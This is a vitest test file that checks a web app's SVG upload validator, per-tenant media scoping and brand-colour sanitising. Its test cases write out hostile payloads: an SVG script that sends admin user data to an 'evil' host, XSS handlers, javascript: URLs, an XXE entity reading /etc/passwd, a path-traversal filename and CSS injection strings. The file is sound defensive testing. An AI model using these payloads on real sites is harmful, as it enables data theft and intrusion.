import { describe, it, expect, beforeAll, afterAll } from "vitest"
import { eq } from "drizzle-orm"
import * as schema from "@/server/db/schema"
import { createTestDb } from "../helpers/db"
import { getArena, getAdminUser, makeArena, testActor } from "../helpers/fixtures"
import { inspectSvg, uploadMedia, listMedia } from "@/server/services/media"
import { getPublicSiteContent } from "@/server/services/public-content"

let ctx: Awaited<ReturnType<typeof createTestDb>>
let arena: schema.Arena
let other: schema.Arena
/** A real user: uploads record who made them, and that is a foreign key. */
let actor: typeof testActor

beforeAll(async () => {
  ctx = await createTestDb()
  arena = await getArena(ctx.db)
  other = await makeArena(ctx.db, "arena-b")
  actor = { ...testActor, id: (await getAdminUser(ctx.db)).id }
})
afterAll(async () => {
  await ctx.client.close()
})

const svg = (inner: string) => `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">${inner}</svg>`
const png = () => Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(24)])

describe("an uploaded SVG is a document, not a picture", () => {
  it("accepts a plain drawing", () => {
    expect(inspectSvg(svg('<circle cx="5" cy="5" r="4" fill="#16a34a"/>'))).toEqual({ ok: true })
    expect(inspectSvg(`<?xml version="1.0"?>${svg("<rect width='10' height='10'/>")}`)).toEqual({ ok: true })
  })

  it("rejects every way an SVG can execute or reach out", () => {
    // Each of these renders as an image and runs as a document.
    const attacks: Array<[string, string]> = [
      ["inline script", svg("<script>fetch('/api/admin/users').then(r=>r.text()).then(t=>fetch('//evil',{method:'POST',body:t}))</script>")],
      ["event handler", svg('<circle r="4" onload="alert(document.cookie)"/>')],
      ["error handler", svg('<image href="x" onerror="alert(1)"/>')],
      ["animated handler", svg('<set attributeName="onload" to="alert(1)"/>')],
      ["javascript url", svg('<a href="javascript:alert(1)"><text>x</text></a>')],
      ["embedded html", svg('<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><b>x</b></body></foreignObject>')],
      ["external reference", svg('<use xlink:href="https://evil.example/p.svg#x"/>')],
      ["embedded frame", svg('<iframe src="https://evil.example"></iframe>')],
      ["entity declaration", `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>${svg("<text>&xxe;</text>")}`],
    ]
    for (const [name, source] of attacks) {
      const verdict = inspectSvg(source)
      expect(verdict.ok, `${name} should have been rejected`).toBe(false)
    }
  })

  it("rejects something that is not an SVG at all", () => {
    expect(inspectSvg("<html><body>hi</body></html>").ok).toBe(false)
    expect(inspectSvg("GIF89a").ok).toBe(false)
  })

  it("refuses the upload rather than storing a cleaned copy", async () => {
    const hostile = Buffer.from(svg('<circle r="4" onload="alert(1)"/>'))
    await expect(
      uploadMedia({ buffer: hostile, originalName: "logo.svg", mimeType: "image/svg+xml" }, { arenaId: arena.id, actor })
    ).rejects.toMatchObject({ code: "VALIDATION_ERROR" })
    expect((await listMedia(arena.id)).items).toHaveLength(0)
  })

  it("stores a safe one under the arena's own prefix", async () => {
    const safe = Buffer.from(svg('<circle cx="5" cy="5" r="4"/>'))
    const row = await uploadMedia({ buffer: safe, originalName: "../../etc/passwd.svg", mimeType: "image/svg+xml" }, { arenaId: arena.id, actor })
    // The name is generated, so a traversal attempt in the original filename
    // never reaches the filesystem, and the key is scoped to the arena.
    expect(row.storageKey.startsWith(`${arena.id}/`)).toBe(true)
    expect(row.storageKey).not.toContain("..")
    expect(row.originalName).toBe("../../etc/passwd.svg")
  })

  it("keeps one arena's media out of another's library", async () => {
    await uploadMedia({ buffer: png(), originalName: "b.png", mimeType: "image/png" }, { arenaId: other.id, actor })
    expect((await listMedia(arena.id)).items.map((m) => m.originalName)).toEqual(["../../etc/passwd.svg"])
    expect((await listMedia(other.id)).items.map((m) => m.originalName)).toEqual(["b.png"])
  })
})

describe("branding belongs to the arena", () => {
  it("serves each arena its own colours and logo", async () => {
    const logo = await uploadMedia({ buffer: png(), originalName: "logo.png", mimeType: "image/png" }, { arenaId: arena.id, actor })
    await ctx.db
      .update(schema.arenas)
      .set({ brandPrimaryColor: "#16a34a", brandAccentColor: "#0ea5e9", logoMediaId: logo.id })
      .where(eq(schema.arenas.id, arena.id))

    const mine = await getPublicSiteContent(arena.id)
    expect(mine.branding.primaryColor).toBe("#16a34a")
    expect(mine.branding.accentColor).toBe("#0ea5e9")
    expect(mine.branding.logoUrl).toBe(logo.url)

    // The other arena set none, so it gets the product default rather than
    // the first arena's palette.
    const theirs = await getPublicSiteContent(other.id)
    expect(theirs.branding.primaryColor).toBeNull()
    expect(theirs.branding.logoUrl).toBeNull()
  })

  it("drops a colour that is not a plain hex value", async () => {
    // The value goes into a CSS custom property, so anything that could end
    // the declaration is refused rather than escaped.
    for (const hostile of ["red;} body{display:none", "url(javascript:alert(1))", "#16a34a;--x:y", "expression(alert(1))", ""]) {
      await ctx.db.update(schema.arenas).set({ brandPrimaryColor: hostile }).where(eq(schema.arenas.id, arena.id))
      expect((await getPublicSiteContent(arena.id)).branding.primaryColor, hostile).toBeNull()
    }
    await ctx.db.update(schema.arenas).set({ brandPrimaryColor: "#ABC" }).where(eq(schema.arenas.id, arena.id))
    expect((await getPublicSiteContent(arena.id)).branding.primaryColor).toBe("#abc")
  })

  it("will not show a logo belonging to another arena", async () => {
    const theirLogo = (await listMedia(other.id)).items[0]
    await ctx.db.update(schema.arenas).set({ logoMediaId: theirLogo.id }).where(eq(schema.arenas.id, arena.id))
    // The lookup is arena-scoped, so a stale or hostile reference yields no logo.
    expect((await getPublicSiteContent(arena.id)).branding.logoUrl).toBeNull()
  })
})
